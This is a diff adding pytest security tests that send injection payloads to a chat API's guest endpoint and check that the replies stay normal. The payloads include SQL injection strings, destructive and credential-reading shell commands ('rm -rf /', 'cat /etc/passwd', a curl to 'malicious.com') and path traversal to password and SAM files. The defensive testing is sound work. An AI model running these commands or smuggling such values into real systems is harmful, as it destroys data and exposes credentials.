@@ -1,0 +1,127 @@
+"""
+Security Input Sanitization Tests - Week 8
+
+Tests input sanitization and injection prevention:
+- SQL injection prevention
+- Command injection prevention
+- Path traversal prevention
+
+These tests advance Security coverage from 85% toward 100%.
+"""
+
+import pytest
+from httpx import AsyncClient
+from fastapi import status
+
+
+pytestmark = [pytest.mark.asyncio, pytest.mark.integration, pytest.mark.security]
+
+
+class TestSecurityInputSanitization:
+    """Test input sanitization and injection prevention."""
+
+    async def test_sql_injection_prevention(self, client: AsyncClient):
+        """
+        Test SQL injection attack prevention.
+
+        System should sanitize SQL injection attempts and
+        process queries safely without database errors.
+        """
+        sql_injection_payloads = [
+            "' OR '1'='1",
+            "'; DROP TABLE users--",
+            "1' UNION SELECT NULL--",
+            "admin'--",
+            "' OR 1=1--",
+        ]
+
+        for payload in sql_injection_payloads:
+            response = await client.post(
+                "/api/v1/guest/chat",
+                json={
+                    "content": f"Tell me about {payload} in crypto",
+                    "language": "en"
+                }
+            )
+
+            # Should process safely without errors
+            assert response.status_code == status.HTTP_200_OK
+            data = response.json()
+
+            assert "agent_message" in data
+            assert data["agent_message"]["content"]
+            # Should not cause database errors or return error messages
+            assert "error" not in data["agent_message"]["content"].lower() or \
+                   len(data["agent_message"]["content"]) > 50
+
+    async def test_command_injection_prevention(self, client: AsyncClient):
+        """
+        Test command injection attack prevention.
+
+        System should neutralize command injection attempts
+        and prevent system command execution.
+        """
+        command_injection_payloads = [
+            "; ls -la",
+            "| cat /etc/passwd",
+            "& whoami",
+            "`rm -rf /`",
+            "$(curl malicious.com)",
+        ]
+
+        for payload in command_injection_payloads:
+            response = await client.post(
+                "/api/v1/guest/chat",
+                json={
+                    "content": f"Explain DeFi {payload}",
+                    "language": "en"
+                }
+            )
+
+            # Should process safely
+            assert response.status_code == status.HTTP_200_OK
+            data = response.json()
+
+            assert "agent_message" in data
+            # Should provide valid response, not command output
+            agent_response = data["agent_message"]["content"]
+            assert len(agent_response) > 20
+            # Should not contain typical command output markers
+            assert "root:" not in agent_response
+            assert "/etc/passwd" not in agent_response
+            assert "total " not in agent_response[:50]  # ls output
+
+    async def test_path_traversal_prevention(self, client: AsyncClient):
+        """
+        Test path traversal attack prevention.
+
+        System should prevent attempts to access files
+        outside allowed directories.
+        """
+        path_traversal_payloads = [
+            "../../etc/passwd",
+            "....//....//etc/shadow",
+            "..\\..\\windows\\system32",
+            "/etc/passwd",
+            "C:\\Windows\\System32\\config\\SAM",
+        ]
+
+        for payload in path_traversal_payloads:
+            response = await client.post(
+                "/api/v1/guest/chat",
+                json={
+                    "content": f"Show me information about {payload}",
+                    "language": "en"
+                }
+            )
+
+            # Should process safely
+            assert response.status_code == status.HTTP_200_OK
+            data = response.json()
+
+            assert "agent_message" in data
+            agent_response = data["agent_message"]["content"]
+
+            # Should not contain file contents
+            assert "root:x:" not in agent_response  # /etc/passwd content
+            assert len(agent_response) > 20, "Should provide valid response"
